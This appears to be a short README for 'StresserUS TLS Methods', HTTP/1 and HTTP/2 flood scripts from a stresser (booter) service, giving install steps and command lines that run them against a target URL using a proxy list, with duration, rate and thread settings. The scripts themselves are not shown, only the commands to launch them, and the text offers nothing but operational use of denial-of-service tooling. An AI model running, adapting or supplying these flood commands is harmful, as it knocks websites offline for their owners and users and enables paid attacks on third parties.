# https-methods
StresserUS TLS Methods

sh install.sh

npm i randomstring

node http1.js GET "https://website.com" http.txt 120 64 1

node http2.js GET "https://website.com" http.txt 120 64 1


Methods developed from scratch for Stresser.US, those are the old methods
